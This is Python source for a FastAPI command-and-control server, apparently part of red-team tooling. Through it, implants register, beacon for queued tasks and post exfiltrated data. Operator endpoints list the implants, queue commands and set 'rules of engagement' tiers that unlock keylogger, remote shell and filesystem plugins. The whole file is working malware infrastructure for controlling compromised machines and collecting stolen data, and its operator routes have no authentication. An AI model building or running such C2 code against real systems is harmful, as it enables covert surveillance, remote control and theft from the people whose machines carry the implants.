from fastapi import APIRouter, Depends, HTTPException, Body
from typing import Dict, Any

from . import models
from . import security

router = APIRouter()

# ==============================================================================
# In-Memory "Database"
# In a real system, this would be a proper database (e.g., PostgreSQL, Redis).
# For Phase 1, we use a simple dictionary.
# ==============================================================================
IMPLANTS_DB: Dict[str, models.Implant] = {}


# ==============================================================================
# ROE (Rules of Engagement) Logic
# ==============================================================================
ROE_GATES = {
    # Tier: [list_of_allowed_plugins]
    1: ["keylogger", "shell", "filesystem", "dummy"],  # Example: Tier 1 can do anything
    2: ["keylogger", "filesystem", "dummy"],           # Example: Tier 2 can do passive recon
    3: [],                                             # Example: Tier 3 is dormant until elevated
}

def check_roe(implant_id: str, command: str, args: Dict[str, Any]) -> bool:
    """Checks if a command is allowed for an implant's ROE tier."""
    # Allow non-plugin commands unconditionally for now.
    if command != "start_plugin":
        return True

    plugin_name = args.get("plugin_name")
    if not plugin_name:
        return False # Can't start a plugin without a name

    tier = IMPLANTS_DB[implant_id].roe_tier
    if plugin_name in ROE_GATES.get(tier, []):
        return True

    return False

# ==============================================================================
# API Endpoints for Implant Communication
# ==============================================================================

@router.post("/register", response_model=models.RegistrationResponse)
def register_implant(registration: models.ImplantRegistration):
    """Called by a new implant to register itself with the C2."""
    implant = models.Implant(**registration.dict())
    IMPLANTS_DB[implant.id] = implant

    token = security.create_access_token(data={"sub": implant.id})
    return {"implant_id": implant.id, "token": token}

@router.get("/tasks", response_model=models.TaskResponse)
def get_tasks(current_implant_id: str = Depends(security.get_current_implant_id)):
    """Called by an implant to beacon for new tasks."""
    implant = IMPLANTS_DB.get(current_implant_id)
    if not implant:
        raise HTTPException(status_code=404, detail="Implant not found")

    tasks = implant.tasks
    implant.tasks = []  # Clear tasks after fetching
    return {"tasks": tasks}

@router.post("/data")
def submit_data(payload: models.DataPayload, current_implant_id: str = Depends(security.get_current_implant_id)):
    """Called by an implant to exfiltrate collected data."""
    # In a real system, this data would be written to a secure, structured log or database.
    # For now, we just print it to the C2 server's console.
    print(f"[DATA] Received from {current_implant_id} ({payload.plugin}): {payload.data[:200]}")
    return {"status": "received"}

# ==============================================================================
# API Endpoints for Operator CLI
# These should be protected by a separate operator authentication system in a
# real-world scenario.
# ==============================================================================

@router.get("/admin/implants", response_model=Dict[str, models.Implant])
def list_implants():
    """Lists all currently registered implants."""
    return IMPLANTS_DB

@router.post("/admin/tasks/{implant_id}", response_model=Dict)
def add_task(implant_id: str, task: models.Task = Body(...)):
    """Adds a new task to an implant's queue."""
    if implant_id not in IMPLANTS_DB:
        raise HTTPException(status_code=404, detail="Implant not found")

    # Enforce ROE before tasking
    if not check_roe(implant_id, task.command, task.args):
        tier = IMPLANTS_DB[implant_id].roe_tier
        plugin = task.args.get('plugin_name', 'unknown')
        raise HTTPException(
            status_code=403,
            detail=f"ROE VIOLATION: Plugin '{plugin}' is not authorized for Tier {tier} targets."
        )

    IMPLANTS_DB[implant_id].tasks.append(task)
    return {"status": "task added", "task_id": task.task_id}

@router.put("/admin/tier/{implant_id}/{tier}", response_model=Dict)
def set_implant_tier(implant_id: str, tier: int):
    """Sets the ROE engagement tier for a specific implant."""
    if implant_id not in IMPLANTS_DB:
        raise HTTPException(status_code=404, detail="Implant not found")
    if tier not in ROE_GATES:
        raise HTTPException(status_code=400, detail=f"Invalid tier. Must be one of {list(ROE_GATES.keys())}.")

    IMPLANTS_DB[implant_id].roe_tier = tier
    return {"status": "tier updated", "implant_id": implant_id, "new_tier": tier}
